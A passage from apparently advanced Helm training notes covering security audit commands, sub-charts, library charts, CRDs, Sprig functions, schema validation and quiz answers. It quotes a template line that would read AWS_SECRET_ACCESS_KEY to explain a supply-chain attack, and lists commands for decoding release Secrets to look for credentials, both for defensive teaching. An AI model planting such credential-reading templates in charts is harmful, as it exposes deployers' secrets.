1) kubectl get secrets -A | grep helm.sh/release — find all Helm release Secrets across all namespaces and who has access. 2) grep -r "helm.sh/hook" ./chart/templates/ — find all hooks before trusting a chart, since hooks run code before you see the main resources. 3) grep -rn "tpl(" ./chart/templates/ — find all uses of the tpl function and assess whether user-controlled values can reach them. 4) Decode a sample release Secret and grep the output for known credential patterns (passwords, tokens, keys) — check if sensitive values were accidentally passed via --set or values.yaml.

11 · Extras From Official Helm Documentation

These weren't covered in the live session — added after reviewing helm.sh documentation for topics genuinely useful at an advanced level.

Chart Dependencies (Sub-Charts)

Instead of deploying a database chart and an application chart separately, you can declare the database as a dependency of the application chart. Helm then downloads it and installs everything as a single release.

# In Chart.yaml
dependencies:
  - name: postgresql
    version: "~15.0"          # accepts any 15.x version
    repository: "https://charts.bitnami.com/bitnami"
    condition: postgresql.enabled   # optional: skip if values.postgresql.enabled=false
# Download dependencies into charts/
helm dependency update ./mychart

# Now helm install will deploy both your app and PostgreSQL together
helm install myapp ./mychart

Sub-chart values can be overridden from the parent's values.yaml by nesting them under the sub-chart name. This is how large production charts work — one chart deploys an entire stack.

Library Charts

Setting type: library in Chart.yaml creates a chart that can only be used as a dependency — it cannot be installed directly. It typically contains only _helpers.tpl-style named templates that multiple application charts import. Teams use this to enforce consistent labeling, naming conventions, and annotation standards across all their charts without duplicating the same helper code in every chart.

CRDs Get Special Handling

Custom Resource Definitions placed in crds/ are installed before any other chart resources. This is necessary because other templates might create resources of those custom types — and the types have to be registered in the cluster first.

The restriction: CRD files in crds/ cannot use Go template syntax. They must be plain, static YAML. This is a deliberate Helm design choice — CRDs need to work even before the template engine fully runs.

The Sprig Function Library

Helm's template engine adds roughly 50 extra functions on top of Go's built-ins, from the Sprig library. Examples: {{ .Values.name | upper }}, {{ .Values.tag | default "latest" }}, {{ now | date "2006-01-02" }}, {{ .Values.port | toString }}.

Two Sprig functions — env and expandenv — were deliberately removed from Helm's template engine. They would have allowed chart templates to read the environment variables of the process running Helm — potentially exposing credentials, tokens, or sensitive config that was set in the shell environment before running the helm command.

values.schema.json — Input Validation

A JSON Schema file at the chart root acts as a contract for what values.yaml must look like. If a user passes the wrong type or leaves out a required field, Helm rejects the install/upgrade immediately with a human-readable error — before any resources are created.

{
  "$schema": "https://json-schema.org/draft-07/schema#",
  "properties": {
    "replicaCount": {
      "type": "integer",
      "minimum": 1
    },
    "image": {
      "type": "object",
      "required": ["repository", "tag"],
      "properties": {
        "repository": { "type": "string" },
        "tag": { "type": "string" }
      }
    }
  }
}

The helm upgrade --install Pattern

This is the standard CI/CD deploy command. Instead of:

# Old way — need two different commands and a check
if helm status myapp > /dev/null 2>&1; then
  helm upgrade myapp ./chart
else
  helm install myapp ./chart
fi

Use:

# Modern way — one command, always works
helm upgrade --install myapp ./chart -f values.yaml --atomic
Quick Check — Extras
What is a Helm library chart and when would a team use one?
A chart with type: library in Chart.yaml. It provides reusable named templates (like common label sets, naming conventions, annotation standards) but cannot be installed directly — it has no resource objects. A team uses it when they have multiple application charts that should all use the same helper templates. Instead of copying the same _helpers.tpl into every chart, they publish it as a library chart that other charts declare as a dependency.
Why can't files in the crds/ folder use Go template syntax?
CRDs must be installed before any other resources in the chart, including resources that might use the CRD types. The template engine needs the CRD definitions to be completely static and deterministic so it can register them with the cluster first. If CRDs could contain template syntax, there's a bootstrapping problem: you need the cluster to render the template (to check Capabilities etc.), but the template defines the types the cluster needs to accept. Plain static YAML avoids this entirely.
Why were the env and expandenv functions removed from Helm's Sprig library?
env reads an environment variable from the process running Helm. expandenv expands environment variable references in a string. If these were available in chart templates, a chart author could write {{ env "AWS_SECRET_ACCESS_KEY" }} and extract credentials from the deployer's shell environment. This is a supply chain attack vector — an untrusted chart could silently exfiltrate any environment variable present when helm install runs. Removing them closes that attack path entirely.

Quick Check — Mistakes
What's the correct pattern for handling secrets in a Helm-deployed application?
Never put secrets in values.yaml or pass them via --set (they end up stored in Helm release Secrets in plaintext). Instead: use the External Secrets Operator with a secrets manager like HashiCorp Vault or AWS Secrets Manager — the operator reads the real secret from the vault at deploy time and creates a native Kubernetes Secret. Or use Sealed Secrets — encrypt with a public key, store the encrypted form in Git, and the cluster controller decrypts it. Either way, only encrypted or opaque references exist in version control.
Why is tpl similar to eval() in programming languages?
eval() in JavaScript (or exec() in Python) takes a string and executes it as code. tpl takes a string and executes it as a template. In both cases, if an attacker controls the string, they control what code/template logic runs. The security principle is the same: never pass untrusted, user-controlled data into an eval-like function. Always treat tpl as a code execution point, not just a formatting tool.
